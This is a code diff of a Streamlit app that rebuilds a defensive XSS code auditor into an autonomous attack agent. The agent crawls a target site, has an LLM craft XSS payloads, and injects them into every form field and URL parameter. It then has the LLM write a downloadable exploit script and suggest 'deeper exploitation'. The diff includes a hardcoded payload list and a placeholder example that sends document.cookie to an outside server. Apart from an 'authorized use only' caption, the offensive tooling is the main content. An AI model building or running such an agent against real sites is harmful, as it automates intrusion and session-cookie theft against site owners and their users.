@@ -2,463 +2,648 @@ import streamlit as st
 import os
 import subprocess
 import requests
-import json
 import re
 import urllib.parse
+import json
+import time
+import threading
+import queue
 from openai import OpenAI
 from bs4 import BeautifulSoup
+from collections import deque
+from datetime import datetime
 
 st.set_page_config(
-    page_title="XSS & HTML Injection Analyzer",
-    page_icon="🔍",
-    layout="wide"
+    page_title="XSS Autonomous Agent",
+    page_icon="🕷️",
+    layout="wide",
+    initial_sidebar_state="collapsed",
 )
 
 # ── Constants ────────────────────────────────────────────────────────────────
-MAX_TURNS = 3
-MAX_TOKENS = 1200
-MAX_CODE_CHARS = 8000
 MODEL = "deepseek/deepseek-r1"
 BASE_URL = "https://openrouter.ai/api/v1"
-
-SYSTEM_PROMPT = """You are an expert white-hat security code auditor specializing in XSS (Cross-Site Scripting) and HTML Injection vulnerabilities.
-
-Your job:
-1. Analyze source code or HTML for sanitization flaws.
-2. Check how the code handles special characters: < > " ' / & ` = { }
-3. Detect missing encoding (e.g., htmlspecialchars, escapeHTML, DOMPurify, Content Security Policy).
-4. Identify Stored XSS, Reflected XSS, DOM-based XSS, and HTML Injection sinks.
-5. Flag dangerous patterns: innerHTML, document.write, eval, dangerouslySetInnerHTML, unescaped template literals, unsanitized DB output rendered into HTML.
-6. Produce a structured security report:
-   - VULNERABILITY SUMMARY (severity: Critical/High/Medium/Low)
-   - AFFECTED CODE LINES with exact location
-   - ATTACK SCENARIO (how an attacker would exploit it)
-   - SECURE REMEDIATION with corrected code snippet
-7. Be concise. No boilerplate. Skip safe code. Focus only on flaws.
-
-If the user specifies a target URL and focus area, prioritize findings relevant to that context."""
+MAX_TOKENS = 1500
+MAX_CRAWL_DEPTH = 3
+MAX_PAGES = 40
+REQUEST_TIMEOUT = 10
+HEADERS = {
+    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
+}
 
 # ── Session state ─────────────────────────────────────────────────────────────
-if "history" not in st.session_state:
-    st.session_state.history = []
-if "poc_results" not in st.session_state:
-    st.session_state.poc_results = []
-if "cmd_output" not in st.session_state:
-    st.session_state.cmd_output = ""
-if "analysis_result" not in st.session_state:
-    st.session_state.analysis_result = ""
+defaults = {
+    "log": [],
+    "findings": [],
+    "running": False,
+    "done": False,
+    "pages_crawled": 0,
+    "points_found": 0,
+    "vulns_found": 0,
+    "exploit_code": "",
+}
+for k, v in defaults.items():
+    if k not in st.session_state:
+        st.session_state[k] = v
 
 # ── Helpers ───────────────────────────────────────────────────────────────────
 
-def get_client() -> OpenAI:
-    api_key = os.environ.get("OPENROUTER_API_KEY", "")
-    if not api_key:
-        st.error("OPENROUTER_API_KEY is not set. Add it in Replit Secrets.")
+def get_client():
+    key = os.environ.get("OPENROUTER_API_KEY", "")
+    if not key:
+        st.error("OPENROUTER_API_KEY not set in Replit Secrets.")
         st.stop()
-    return OpenAI(api_key=api_key, base_url=BASE_URL)
+    return OpenAI(api_key=key, base_url=BASE_URL)
 
 
-def extract_relevant_blocks(code: str, max_chars: int = MAX_CODE_CHARS) -> str:
-    """Extract only high-risk code blocks to save tokens."""
-    if len(code) <= max_chars:
-        return code
+def ts():
+    return datetime.now().strftime("%H:%M:%S")
 
-    risk_patterns = [
-        r'innerHTML', r'outerHTML', r'document\.write', r'eval\s*\(',
-        r'dangerouslySetInnerHTML', r'\.html\s*\(', r'v-html',
-        r'<\s*script', r'on\w+\s*=', r'htmlspecialchars', r'escape',
-        r'sanitize', r'DOMPurify', r'\$_GET', r'\$_POST', r'\$_REQUEST',
-        r'request\.(args|form|json|data)', r'req\.(body|query|params)',
-        r'getParameter', r'getAttribute', r'render\s*\(',
-        r'template\s*\(', r'format\s*\(.*input', r'f["\'].*\{',
-        r'printf.*input', r'echo\s+\$', r'print\s+\$',
+
+def log(msg: str, kind: str = "info"):
+    icons = {"info": "▸", "ok": "✅", "warn": "⚠️", "vuln": "🚨", "ai": "🤖", "cmd": "⚙️"}
+    prefix = icons.get(kind, "▸")
+    st.session_state.log.append(f"[{ts()}] {prefix} {msg}")
+
+
+def safe_get(url: str, **kwargs) -> requests.Response | None:
+    try:
+        return requests.get(url, headers=HEADERS, timeout=REQUEST_TIMEOUT,
+                            allow_redirects=True, **kwargs)
+    except Exception:
+        return None
+
+
+def same_origin(base: str, url: str) -> bool:
+    try:
+        b = urllib.parse.urlparse(base)
+        u = urllib.parse.urlparse(url)
+        return b.netloc == u.netloc
+    except Exception:
+        return False
+
+
+def absolute(base: str, href: str) -> str | None:
+    try:
+        url = urllib.parse.urljoin(base, href)
+        parsed = urllib.parse.urlparse(url)
+        if parsed.scheme in ("http", "https") and parsed.netloc:
+            return url
+    except Exception:
+        pass
+    return None
+
+
+# ── Phase 1: Crawl ────────────────────────────────────────────────────────────
+
+def crawl(target: str) -> list[dict]:
+    """BFS crawl — returns list of {url, html, forms, params}."""
+    visited = set()
+    queue_urls = deque([(target, 0)])
+    pages = []
+    base_origin = urllib.parse.urlparse(target).netloc
+
+    while queue_urls and len(pages) < MAX_PAGES:
+        url, depth = queue_urls.popleft()
+        norm = url.split("#")[0].rstrip("/")
+        if norm in visited:
+            continue
+        visited.add(norm)
+
+        resp = safe_get(url)
+        if not resp or "text/html" not in resp.headers.get("Content-Type", ""):
+            continue
+
+        soup = BeautifulSoup(resp.text, "html.parser")
+        forms = extract_forms(url, soup)
+        params = extract_url_params(url)
+
+        pages.append({
+            "url": url,
+            "html": resp.text[:12000],
+            "status": resp.status_code,
+            "headers": dict(resp.headers),
+            "forms": forms,
+            "params": params,
+        })
+        log(f"Crawled [{len(pages)}/{MAX_PAGES}]: {url}", "cmd")
+        st.session_state.pages_crawled = len(pages)
+
+        if depth < MAX_CRAWL_DEPTH:
+            for tag in soup.find_all("a", href=True):
+                href = tag["href"]
+                next_url = absolute(url, href)
+                if next_url and same_origin(target, next_url):
+                    norm_next = next_url.split("#")[0].rstrip("/")
+                    if norm_next not in visited:
+                        queue_urls.append((next_url, depth + 1))
+
+    return pages
+
+
+def extract_forms(page_url: str, soup: BeautifulSoup) -> list[dict]:
+    forms = []
+    for form in soup.find_all("form"):
+        action = form.get("action", "")
+        method = form.get("method", "get").lower()
+        action_url = absolute(page_url, action) if action else page_url
+        fields = []
+        for inp in form.find_all(["input", "textarea", "select"]):
+            name = inp.get("name") or inp.get("id") or ""
+            itype = inp.get("type", "text")
+            if name and itype not in ("submit", "button", "image", "file", "hidden"):
+                fields.append({"name": name, "type": itype})
+        if fields and action_url:
+            forms.append({"action": action_url, "method": method, "fields": fields})
+    return forms
+
+
+def extract_url_params(url: str) -> list[str]:
+    parsed = urllib.parse.urlparse(url)
+    return list(urllib.parse.parse_qs(parsed.query).keys())
+
+
+# ── Phase 2: AI generates payloads ────────────────────────────────────────────
+
+def ai_generate_payloads(client: OpenAI, target: str, user_payload: str,
+                          context_snippet: str) -> list[str]:
+    """Ask the AI to craft context-aware XSS/HTML injection payloads."""
+    prompt = f"""You are an offensive security expert generating XSS and HTML injection test payloads.
+
+Target: {target}
+User-specified injection content: {user_payload}
+Context (relevant HTML/JS around the injection point):
+{context_snippet[:2000]}
+
+Generate 10 payloads that are likely to succeed given this specific context.
+Include:
+- Basic XSS variants
+- Attribute injection variants
+- DOM-based variants  
+- Event handler variants
+- Encoded variants (HTML entities, URL encoding, unicode)
+- The user-specified payload adapted to this context
+
+Output ONLY a JSON array of payload strings, nothing else. Example:
+["<script>alert(1)</script>", "...", "..."]"""
+
+    try:
+        resp = client.chat.completions.create(
+            model=MODEL,
+            messages=[{"role": "user", "content": prompt}],
+            max_tokens=600,
+            temperature=0.4,
+        )
+        text = resp.choices[0].message.content.strip()
+        text = re.sub(r"```json|```", "", text).strip()
+        match = re.search(r"\[.*\]", text, re.DOTALL)
+        if match:
+            return json.loads(match.group())
+    except Exception as e:
+        log(f"AI payload gen error: {e}", "warn")
+
+    # Fallback payloads
+    return [
+        user_payload,
+        f'<script>alert("XSS")</script>',
+        f'"><script>alert(1)</script>',
+        f"'><img src=x onerror=alert(1)>",
+        f'<svg onload=alert(1)>',
+        f'<iframe srcdoc="<script>alert(1)</script>">',
+        f'javascript:alert(1)',
+        f'<body onload=alert(1)>',
+        f'{{{{7*7}}}}',
+        f'${{{user_payload}}}',
     ]
 
-    lines = code.splitlines(keepends=True)
-    flagged_lines = set()
-    for i, line in enumerate(lines):
-        for pat in risk_patterns:
-            if re.search(pat, line, re.IGNORECASE):
-                for j in range(max(0, i - 5), min(len(lines), i + 10)):
-                    flagged_lines.add(j)
-                break
 
-    if not flagged_lines:
-        return code[:max_chars] + "\n\n[... truncated for token budget ...]"
+# ── Phase 3: Test injection points ────────────────────────────────────────────
 
-    chunks = []
-    total = 0
-    for idx in sorted(flagged_lines):
-        chunk = lines[idx]
-        if total + len(chunk) > max_chars:
-            break
-        chunks.append(chunk)
-        total += len(chunk)
+def test_reflection(url: str, param: str, payload: str, method: str = "get") -> dict:
+    """Test if payload reflects unescaped in the response."""
+    result = {
+        "url": url, "param": param, "payload": payload,
+        "method": method, "status": None, "reflected": False,
+        "escaped": False, "body_snippet": ""
+    }
+    try:
+        if method == "get":
+            parsed = urllib.parse.urlparse(url)
+            params = dict(urllib.parse.parse_qsl(parsed.query))
+            params[param] = payload
+            test_url = parsed._replace(query=urllib.parse.urlencode(params)).geturl()
+            resp = requests.get(test_url, headers=HEADERS, timeout=REQUEST_TIMEOUT,
+                                allow_redirects=True)
+        else:
+            resp = requests.post(url, data={param: payload}, headers=HEADERS,
+                                 timeout=REQUEST_TIMEOUT, allow_redirects=True)
 
-    result = "".join(chunks)
-    if len(result) < len(code):
-        result += "\n\n[... non-risky sections omitted for token budget ...]"
+        result["status"] = resp.status_code
+        body = resp.text
+
+        # Check raw reflection
+        if payload in body:
+            result["reflected"] = True
+            # Check if it's escaped
+            escaped_variants = [
+                payload.replace("<", "&lt;").replace(">", "&gt;"),
+                payload.replace('"', "&quot;"),
+                urllib.parse.quote(payload),
+            ]
+            if any(v in body for v in escaped_variants):
+                result["escaped"] = True
+
+            # Grab snippet around reflection
+            idx = body.find(payload)
+            result["body_snippet"] = body[max(0, idx - 100):idx + 200]
+
+    except Exception as e:
+        result["error"] = str(e)
+
     return result
 
 
-def trim_history(history: list) -> list:
-    """Keep only last MAX_TURNS exchanges to cap context size."""
-    if len(history) > MAX_TURNS * 2:
-        return history[-(MAX_TURNS * 2):]
-    return history
+def test_form(form: dict, payloads: list[str]) -> list[dict]:
+    """Test all fields in a form with all payloads."""
+    hits = []
+    for field in form.get("fields", []):
+        for payload in payloads[:5]:  # cap per field to save time
+            r = test_reflection(form["action"], field["name"], payload, form["method"])
+            if r["reflected"] and not r["escaped"]:
+                hits.append(r)
+                log(f"🚨 UNESCAPED REFLECTION: {form['action']} field={field['name']}", "vuln")
+            elif r["reflected"]:
+                log(f"Escaped reflection at {form['action']} field={field['name']}", "warn")
+    return hits
 
 
-def analyze_code(code: str, target_url: str, focus: str) -> str:
-    client = get_client()
-    trimmed_code = extract_relevant_blocks(code)
-
-    user_msg = ""
-    if target_url:
-        user_msg += f"Target URL: {target_url}\n"
-    if focus:
-        user_msg += f"Focus area: {focus}\n"
-    user_msg += f"\n--- SOURCE CODE ---\n{trimmed_code}\n--- END ---"
-
-    st.session_state.history.append({"role": "user", "content": user_msg})
-    st.session_state.history = trim_history(st.session_state.history)
-
-    messages = [{"role": "system", "content": SYSTEM_PROMPT}] + st.session_state.history
-
-    response = client.chat.completions.create(
-        model=MODEL,
-        messages=messages,
-        max_tokens=MAX_TOKENS,
-        temperature=0.2,
-    )
-    reply = response.choices[0].message.content
-    st.session_state.history.append({"role": "assistant", "content": reply})
-    st.session_state.history = trim_history(st.session_state.history)
-    return reply
+def test_url_params(page: dict, payloads: list[str]) -> list[dict]:
+    """Test all URL params of a page."""
+    hits = []
+    for param in page.get("params", []):
+        for payload in payloads[:5]:
+            r = test_reflection(page["url"], param, payload, "get")
+            if r["reflected"] and not r["escaped"]:
+                hits.append(r)
+                log(f"🚨 UNESCAPED REFLECTION: {page['url']} param={param}", "vuln")
+    return hits
 
 
-def ask_followup(question: str) -> str:
-    client = get_client()
-    st.session_state.history.append({"role": "user", "content": question})
-    st.session_state.history = trim_history(st.session_state.history)
+# ── Phase 4: AI writes exploit + report ──────────────────────────────────────
 
-    messages = [{"role": "system", "content": SYSTEM_PROMPT}] + st.session_state.history
+def ai_write_exploit(client: OpenAI, findings: list[dict], target: str) -> str:
+    if not findings:
+        return ""
 
-    response = client.chat.completions.create(
-        model=MODEL,
-        messages=messages,
-        max_tokens=MAX_TOKENS,
-        temperature=0.2,
-    )
-    reply = response.choices[0].message.content
-    st.session_state.history.append({"role": "assistant", "content": reply})
-    st.session_state.history = trim_history(st.session_state.history)
-    return reply
+    sample = findings[0]
+    prompt = f"""You are a penetration tester writing a minimal proof-of-concept exploit.
 
+Target: {target}
+Vulnerable endpoint: {sample['url']}
+Injection parameter: {sample['param']}
+Working payload: {sample['payload']}
+Method: {sample['method']}
+Response snippet: {sample.get('body_snippet', '')[:500]}
 
-def run_command(cmd: str) -> str:
-    """Execute a shell command and return combined stdout+stderr."""
+Write a short Python script (using requests) that exploits this XSS vulnerability.
+The script should send the payload and verify it's reflected.
+Include comments explaining each step.
+Output ONLY the Python code."""
+
     try:
-        result = subprocess.run(
-            cmd,
-            shell=True,
-            capture_output=True,
-            text=True,
-            timeout=30
+        resp = client.chat.completions.create(
+            model=MODEL,
+            messages=[{"role": "user", "content": prompt}],
+            max_tokens=MAX_TOKENS,
+            temperature=0.2,
         )
-        out = result.stdout or ""
-        err = result.stderr or ""
-        return (out + err).strip() or "(no output)"
-    except subprocess.TimeoutExpired:
-        return "[ERROR] Command timed out after 30 seconds."
+        code = resp.choices[0].message.content.strip()
+        code = re.sub(r"```python|```", "", code).strip()
+        return code
     except Exception as e:
-        return f"[ERROR] {e}"
+        return f"# Error generating exploit: {e}"
 
 
-# ── PoC XSS payloads ──────────────────────────────────────────────────────────
-XSS_PAYLOADS = [
-    ('<script>alert("XSS")</script>', "Basic script tag"),
-    ('"><script>alert(1)</script>', "Attribute breakout + script"),
-    ("'><img src=x onerror=alert(1)>", "Single-quote breakout + img onerror"),
-    ('<svg onload=alert(1)>', "SVG onload"),
-    ('javascript:alert(1)', "javascript: URI"),
-    ('<iframe src="javascript:alert(1)">', "iframe javascript URI"),
-    ('"><body onload=alert(1)>', "Body onload injection"),
-    ('{{7*7}}', "Template injection probe"),
-]
+def ai_full_report(client: OpenAI, findings: list[dict], pages: list[dict],
+                   target: str) -> str:
+    if not findings:
+        no_vuln_prompt = f"""You are a security researcher who just completed a crawl and XSS test of {target}.
+No unescaped reflections were found with standard payloads, but here are potential attack surfaces discovered:
 
+Pages crawled: {len(pages)}
+Forms found: {sum(len(p['forms']) for p in pages)}
+URL params found: {sum(len(p['params']) for p in pages)}
 
-def probe_url_for_xss(target_url: str, param: str) -> list:
-    """
-    Send harmless PoC payloads to a target URL parameter and check if
-    they are reflected unescaped in the response body.
-    This is a reflection check only — no actual code execution.
-    """
-    results = []
-    session = requests.Session()
-    session.headers.update({
-        "User-Agent": "WhiteHat-XSS-Analyzer/1.0 (authorized security test)"
-    })
+Page list: {[p['url'] for p in pages[:10]]}
 
-    for payload, label in XSS_PAYLOADS:
+Based on this surface area, suggest:
+1. What manual tests to run next (blind XSS, stored XSS via forms, DOM-based XSS)
+2. What specific payloads to try
+3. What headers to check (CSP, X-Frame-Options, etc.)
+4. Any suspicious patterns you'd investigate further
+
+Be specific and actionable."""
         try:
-            # Try GET param injection
-            parsed = urllib.parse.urlparse(target_url)
-            params = dict(urllib.parse.parse_qsl(parsed.query))
-            if param:
-                params[param] = payload
-            else:
-                params["q"] = payload
-
-            test_url = parsed._replace(query=urllib.parse.urlencode(params)).geturl()
-            resp = session.get(test_url, timeout=10, allow_redirects=True)
-            body = resp.text
-
-            reflected = payload in body
-            escaped = (
-                payload.replace("<", "&lt;").replace(">", "&gt;") in body
-                or payload.replace('"', "&quot;") in body
+            resp = client.chat.completions.create(
+                model=MODEL,
+                messages=[{"role": "user", "content": no_vuln_prompt}],
+                max_tokens=MAX_TOKENS,
+                temperature=0.3,
             )
-
-            if reflected and not escaped:
-                status = "⚠️ REFLECTED UNESCAPED"
-            elif reflected and escaped:
-                status = "✅ Reflected but escaped"
-            else:
-                status = "➖ Not reflected"
-
-            results.append({
-                "payload": payload,
-                "label": label,
-                "status": status,
-                "url": test_url,
-                "http_status": resp.status_code,
-            })
+            return resp.choices[0].message.content
         except Exception as e:
-            results.append({
-                "payload": payload,
-                "label": label,
-                "status": f"❌ Error: {e}",
-                "url": target_url,
-                "http_status": "N/A",
-            })
+            return f"Error: {e}"
 
-    return results
+    findings_summary = json.dumps([{
+        "url": f["url"], "param": f["param"], "payload": f["payload"],
+        "method": f["method"], "snippet": f.get("body_snippet", "")[:200]
+    } for f in findings[:8]], indent=2)
+
+    prompt = f"""You are a senior penetration tester. Write a professional security report.
+
+Target: {target}
+Confirmed unescaped XSS/HTML injection findings:
+{findings_summary}
+
+Write:
+## Executive Summary
+## Findings (one section per unique vulnerability, with severity, CVSS, description, PoC steps)
+## Remediation Recommendations
+## Next Steps for Deeper Exploitation
+
+Be technical, precise, and actionable."""
+
+    try:
+        resp = client.chat.completions.create(
+            model=MODEL,
+            messages=[{"role": "user", "content": prompt}],
+            max_tokens=MAX_TOKENS,
+            temperature=0.2,
+        )
+        return resp.choices[0].message.content
+    except Exception as e:
+        return f"Error generating report: {e}"
+
+
+# ── Phase 5: Header / CSP analysis ───────────────────────────────────────────
+
+def analyze_headers(headers: dict) -> list[str]:
+    issues = []
+    checks = {
+        "Content-Security-Policy": "Missing CSP header — no XSS policy enforced.",
+        "X-XSS-Protection": "Missing X-XSS-Protection (legacy browsers at risk).",
+        "X-Content-Type-Options": "Missing X-Content-Type-Options — MIME sniffing possible.",
+        "X-Frame-Options": "Missing X-Frame-Options — clickjacking risk.",
+        "Strict-Transport-Security": "Missing HSTS header.",
+    }
+    for header, msg in checks.items():
+        if header.lower() not in {k.lower() for k in headers}:
+            issues.append(msg)
+    csp = {k: v for k, v in headers.items() if k.lower() == "content-security-policy"}
+    if csp:
+        csp_val = list(csp.values())[0]
+        if "unsafe-inline" in csp_val:
+            issues.append("CSP contains 'unsafe-inline' — inline scripts allowed, XSS protection weakened.")
+        if "unsafe-eval" in csp_val:
+            issues.append("CSP contains 'unsafe-eval' — eval() allowed, DOM-based XSS possible.")
+        if "*" in csp_val:
+            issues.append("CSP uses wildcard '*' — overly permissive, bypasses source restrictions.")
+    return issues
+
+
+# ── Main agent runner ─────────────────────────────────────────────────────────
+
+def run_agent(target: str, user_payload: str):
+    client = get_client()
+    st.session_state.log = []
+    st.session_state.findings = []
+    st.session_state.exploit_code = ""
+    st.session_state.pages_crawled = 0
+    st.session_state.points_found = 0
+    st.session_state.vulns_found = 0
+
+    log(f"Target: {target}", "info")
+    log(f"Injection content: {user_payload}", "info")
+    log("━━━━━━━━ PHASE 1: RECONNAISSANCE & CRAWL ━━━━━━━━", "info")
+
+    pages = crawl(target)
+    log(f"Crawl complete — {len(pages)} pages, "
+        f"{sum(len(p['forms']) for p in pages)} forms, "
+        f"{sum(len(p['params']) for p in pages)} URL params", "ok")
+
+    # Analyze headers from first page
+    if pages:
+        header_issues = analyze_headers(pages[0]["headers"])
+        if header_issues:
+            log("━━━━━━━━ HEADER ANALYSIS ━━━━━━━━", "info")
+            for issue in header_issues:
+                log(issue, "warn")
+
+    log("━━━━━━━━ PHASE 2: AI PAYLOAD GENERATION ━━━━━━━━", "ai")
+
+    # Build context snippet from most interesting pages
+    context = ""
+    for p in pages[:5]:
+        if p["forms"] or p["params"]:
+            context += f"\nPage: {p['url']}\n{p['html'][:1000]}\n"
+
+    payloads = ai_generate_payloads(client, target, user_payload, context)
+    log(f"Generated {len(payloads)} custom payloads for this target", "ai")
+    for i, pl in enumerate(payloads[:5], 1):
+        log(f"  Payload {i}: {pl[:80]}", "cmd")
+
+    log("━━━━━━━━ PHASE 3: INJECTION TESTING ━━━━━━━━", "info")
+
+    all_findings = []
+    total_points = 0
+
+    for page in pages:
+        # Test URL params
+        if page["params"]:
+            total_points += len(page["params"])
+            hits = test_url_params(page, payloads)
+            all_findings.extend(hits)
+
+        # Test forms
+        for form in page.get("forms", []):
+            total_points += len(form.get("fields", []))
+            hits = test_form(form, payloads)
+            all_findings.extend(hits)
+
+    st.session_state.points_found = total_points
+    st.session_state.vulns_found = len(all_findings)
+    st.session_state.findings = all_findings
+
+    log(f"Tested {total_points} injection points across {len(pages)} pages", "ok")
+
+    if all_findings:
+        log(f"🚨 {len(all_findings)} UNESCAPED INJECTION POINT(S) CONFIRMED", "vuln")
+        log("━━━━━━━━ PHASE 4: EXPLOIT GENERATION ━━━━━━━━", "ai")
+        log("Writing custom exploit script...", "ai")
+        exploit = ai_write_exploit(client, all_findings, target)
+        st.session_state.exploit_code = exploit
+        log("Exploit script generated", "ok")
+    else:
+        log("No direct unescaped reflections found — checking for blind/stored vectors...", "warn")
+
+    log("━━━━━━━━ PHASE 5: AI SECURITY REPORT ━━━━━━━━", "ai")
+    log("Generating full security report...", "ai")
+    report = ai_full_report(client, all_findings, pages, target)
+    st.session_state.report = report
+    log("Report complete.", "ok")
+    log("━━━━━━━━ SCAN COMPLETE ━━━━━━━━", "ok")
+    st.session_state.done = True
+    st.session_state.running = False
 
 
 # ── UI ────────────────────────────────────────────────────────────────────────
 
-st.title("🔍 XSS & HTML Injection Analyzer")
-st.caption("White-hat security tool — for use only on sites you own or are authorized to test.")
+st.markdown("""
+<style>
+.terminal {
+    background: #0d1117;
+    color: #39ff14;
+    font-family: 'Courier New', monospace;
+    font-size: 13px;
+    padding: 16px;
+    border-radius: 8px;
+    height: 420px;
+    overflow-y: auto;
+    white-space: pre-wrap;
+    border: 1px solid #238636;
+}
+.metric-box {
+    background: #161b22;
+    border: 1px solid #30363d;
+    border-radius: 8px;
+    padding: 12px;
+    text-align: center;
+}
+</style>
+""", unsafe_allow_html=True)
 
-tabs = st.tabs(["📋 Code Analyzer", "🎯 PoC Injection Tester", "💻 Linux Terminal", "💬 Follow-up Chat"])
+st.title("🕷️ XSS Autonomous Agent")
+st.caption("Authorized use only — only target systems you own or have written permission to test.")
 
-# ── Tab 1: Code Analyzer ──────────────────────────────────────────────────────
-with tabs[0]:
-    st.subheader("Analyze Source Code for XSS / HTML Injection")
-
-    col1, col2 = st.columns(2)
+# ── Mission config ────────────────────────────────────────────────────────────
+with st.container(border=True):
+    st.subheader("🎯 Mission Configuration")
+    col1, col2 = st.columns([3, 2])
     with col1:
         target_url = st.text_input(
-            "Target URL (optional)",
-            placeholder="https://example.com/search?q=",
-            help="Provide context for the analysis"
+            "Target URL",
+            placeholder="https://your-test-site.com",
+            help="The site the agent will crawl and attack"
         )
     with col2:
-        focus = st.text_input(
-            "Focus area",
-            placeholder="e.g. search results rendering, comment output, user profile display",
-            help="Tell the AI what part of the app to focus on"
-        )
+        max_depth = st.slider("Crawl depth", 1, 4, 2)
 
-    input_method = st.radio("Input method", ["Paste code", "Upload file"], horizontal=True)
+    user_payload = st.text_area(
+        "What to inject / test",
+        placeholder='e.g.  <script>alert("owned")</script>   or   <img src=x onerror=fetch("https://myserver.com/?c="+document.cookie)>',
+        height=80,
+        help="The AI will adapt this and generate variants for each injection context found"
+    )
 
-    code_input = ""
-    if input_method == "Paste code":
-        code_input = st.text_area(
-            "Paste HTML / source code",
-            height=280,
-            placeholder="Paste the relevant HTML, PHP, JS, Python template, etc. here..."
-        )
-    else:
-        uploaded = st.file_uploader(
-            "Upload source file",
-            type=["html", "php", "js", "ts", "py", "erb", "twig", "jinja", "txt", "jsx", "tsx"]
-        )
-        if uploaded:
-            code_input = uploaded.read().decode("utf-8", errors="replace")
-            st.code(code_input[:2000] + ("..." if len(code_input) > 2000 else ""), language="html")
-
-    col_a, col_b = st.columns([1, 4])
+    col_a, col_b, col_c = st.columns([2, 2, 3])
     with col_a:
-        run_analysis = st.button("🔎 Analyze", type="primary", use_container_width=True)
+        start_btn = st.button("🚀 Launch Agent", type="primary", use_container_width=True,
+                              disabled=st.session_state.running)
     with col_b:
-        if st.button("🗑️ Clear history", use_container_width=False):
-            st.session_state.history = []
-            st.session_state.analysis_result = ""
-            st.success("Conversation history cleared.")
+        if st.button("🗑️ Reset", use_container_width=True):
+            for k, v in defaults.items():
+                st.session_state[k] = v
+            if "report" in st.session_state:
+                del st.session_state["report"]
+            st.rerun()
 
-    turns_used = len(st.session_state.history) // 2
-    st.caption(f"Conversation turns used: {turns_used} / {MAX_TURNS} (older turns auto-discarded)")
+# ── Stats row ─────────────────────────────────────────────────────────────────
+s1, s2, s3, s4 = st.columns(4)
+s1.metric("Pages crawled", st.session_state.pages_crawled)
+s2.metric("Injection points tested", st.session_state.points_found)
+s3.metric("Vulnerabilities found", st.session_state.vulns_found,
+          delta="🚨" if st.session_state.vulns_found > 0 else None)
+s4.metric("Status",
+          "🟢 Running" if st.session_state.running
+          else ("✅ Done" if st.session_state.done else "⏸ Idle"))
 
-    if run_analysis:
-        if not code_input.strip():
-            st.warning("Please paste or upload some source code first.")
-        else:
-            with st.spinner("Analyzing with DeepSeek R1 — this may take 20–40 seconds..."):
-                try:
-                    result = analyze_code(code_input, target_url, focus)
-                    st.session_state.analysis_result = result
-                except Exception as e:
-                    st.error(f"API error: {e}")
+# ── Live terminal ─────────────────────────────────────────────────────────────
+st.subheader("💻 Agent Terminal")
+terminal_placeholder = st.empty()
 
-    if st.session_state.analysis_result:
-        st.divider()
-        st.subheader("📊 Security Report")
-        st.markdown(st.session_state.analysis_result)
+log_text = "\n".join(st.session_state.log) if st.session_state.log else "Waiting for mission launch..."
+terminal_placeholder.markdown(
+    f'<div class="terminal">{log_text}</div>',
+    unsafe_allow_html=True
+)
 
-# ── Tab 2: PoC Injection Tester ───────────────────────────────────────────────
-with tabs[1]:
-    st.subheader("🎯 Proof-of-Concept Reflection Tester")
-    st.warning(
-        "⚠️ **Authorized use only.** Only test sites you own or have explicit written permission to test. "
-        "This tool sends real HTTP requests with XSS payloads to check for unescaped reflection. "
-        "No payloads execute client-side — this is a server-response analysis only."
-    )
+# ── Tabs for results ──────────────────────────────────────────────────────────
+tab1, tab2, tab3 = st.tabs(["📊 Findings", "💻 Exploit Code", "🔍 Manual Terminal"])
 
-    poc_col1, poc_col2 = st.columns(2)
-    with poc_col1:
-        poc_url = st.text_input(
-            "Target URL",
-            placeholder="https://mysite.com/search?q=test",
-            key="poc_url"
-        )
-    with poc_col2:
-        poc_param = st.text_input(
-            "Parameter to inject into",
-            placeholder="q  (leave blank to use 'q')",
-            key="poc_param"
-        )
+with tab1:
+    if st.session_state.findings:
+        st.error(f"🚨 {len(st.session_state.findings)} confirmed injection point(s)")
+        for i, f in enumerate(st.session_state.findings, 1):
+            with st.expander(f"Finding #{i} — {f['url']} [{f['param']}]", expanded=i == 1):
+                st.code(f["payload"], language="html")
+                st.markdown(f"**URL:** `{f['url']}`  \n**Parameter:** `{f['param']}`  \n**Method:** `{f['method'].upper()}`  \n**HTTP Status:** `{f.get('status', 'N/A')}`")
+                if f.get("body_snippet"):
+                    st.markdown("**Response snippet:**")
+                    st.code(f["body_snippet"], language="html")
+    elif st.session_state.done:
+        st.info("No direct unescaped reflections found. See the AI report in the terminal log for next steps.")
+    else:
+        st.info("Run the agent to see findings here.")
 
-    if st.button("🚀 Run PoC Probe", type="primary"):
-        if not poc_url.strip():
-            st.warning("Enter a target URL.")
-        else:
-            with st.spinner("Sending probes..."):
-                try:
-                    results = probe_url_for_xss(poc_url.strip(), poc_param.strip())
-                    st.session_state.poc_results = results
-                except Exception as e:
-                    st.error(f"Probe error: {e}")
+    if hasattr(st.session_state, "report") or "report" in st.session_state:
+        report = st.session_state.get("report", "")
+        if report:
+            st.divider()
+            st.subheader("📝 AI Security Report")
+            st.markdown(report)
 
-    if st.session_state.poc_results:
-        st.divider()
-        st.subheader("Probe Results")
-        for r in st.session_state.poc_results:
-            with st.expander(f"{r['status']} — {r['label']}", expanded="UNESCAPED" in r["status"]):
-                st.code(r["payload"], language="html")
-                st.markdown(f"**HTTP Status:** `{r['http_status']}`")
-                st.markdown(f"**Test URL:** `{r['url']}`")
+with tab2:
+    if st.session_state.exploit_code:
+        st.subheader("🔧 Generated Exploit Script")
+        st.caption("AI-written Python exploit for the confirmed vulnerability")
+        st.code(st.session_state.exploit_code, language="python")
+        st.download_button("⬇️ Download exploit.py", st.session_state.exploit_code,
+                           file_name="exploit.py", mime="text/plain")
+    else:
+        st.info("Exploit code will appear here after a confirmed vulnerability is found.")
 
-        unescaped = [r for r in st.session_state.poc_results if "UNESCAPED" in r["status"]]
-        if unescaped:
-            st.error(f"🚨 {len(unescaped)} payload(s) reflected **unescaped** — potential XSS confirmed.")
-            if st.button("📋 Send findings to AI for analysis"):
-                summary = "The following XSS payloads were reflected unescaped in the HTTP response:\n"
-                for r in unescaped:
-                    summary += f"- Payload: {r['payload']} | URL: {r['url']}\n"
-                summary += "\nAnalyze the risk and recommend server-side fixes."
-                with st.spinner("Consulting AI..."):
-                    reply = ask_followup(summary)
-                    st.markdown(reply)
-        else:
-            st.success("No unescaped reflections detected with these payloads.")
-
-# ── Tab 3: Linux Terminal ─────────────────────────────────────────────────────
-with tabs[2]:
-    st.subheader("💻 Linux Command Runner")
-    st.info(
-        "Run reconnaissance and diagnostic commands against your target. "
-        "Useful tools: `curl`, `wget`, `nmap`, `nikto`, `whatweb`, `nslookup`, `dig`, `whois`, `openssl`."
-    )
-
-    preset_col, _ = st.columns([2, 3])
-    with preset_col:
-        preset = st.selectbox("Quick presets", [
